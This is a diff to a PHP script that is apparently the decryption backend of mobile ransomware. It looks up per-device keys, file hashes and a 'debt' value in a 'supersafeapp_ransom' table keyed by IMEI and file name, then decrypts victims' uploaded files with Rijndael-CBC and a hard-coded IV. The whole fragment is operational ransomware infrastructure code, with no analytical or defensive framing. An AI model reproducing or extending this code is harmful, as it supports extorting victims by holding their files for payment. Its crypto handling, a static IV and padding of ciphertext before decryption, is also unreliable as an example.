@@ -1,6 +1,13 @@
 <?php
 	require_once 'db.php';
+
 	function dbg($x){ echo "<pre>" . print_r($x,true) . "</pre>"; }
+
+	function pkcs5_pad ($text){ 
+		$blocksize = mcrypt_get_block_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
+		$pad = $blocksize - (strlen($text) % $blocksize); 
+		return $text . str_repeat(chr($pad), $pad); 
+	} 
 
 	$iv = pack("C*",127, 0, 127, 15, 0, 14, 101, 0, 127, 0, 127, 15, 0, 14, 101, 0);
 
@@ -9,7 +16,7 @@
 		$sth = $dbh->prepare("SELECT * FROM supersafeapp_ransom WHERE `imei`=? AND `filename`=?");
 		$sth->execute(array($imei,$filename));
 		$c = $sth->fetch(PDO::FETCH_ASSOC);
-		return array($c['key'],$c['sha1'],$c['debt']);
+		return array(trim($c['key']),$c['sha1'],$c['debt']);
 	}
 	
 	$response = false;
@@ -27,12 +34,14 @@
 			$filedata = file_get_contents($_FILES['filedata']['tmp_name']);
 
 			if(sha1($filedata) === $sha1_saved){
+				$filedata = pkcs5_pad($filedata);
+
 				header("Content-Disposition: attachment; filename='$file'");
 				header("Content-Type: application/octet-stream");
 				header("Content-Transfer-Encoding: binary");
 
-				//Workaround: Usar Rijndael pero con 128 en vez de 256. No se porque.
-				echo mcrypt_decrypt(MCRYPT_RIJNDAEL_128,base64_decode($key),$filedata,MCRYPT_MODE_CBC,$iv);
+				$key = base64_decode($key);
+				echo mcrypt_decrypt(MCRYPT_RIJNDAEL_128,$key,$filedata,MCRYPT_MODE_CBC,$iv);
 				exit(0);
 			}else{
 				$response = "No ha ingresado el archivo criptografico!!";
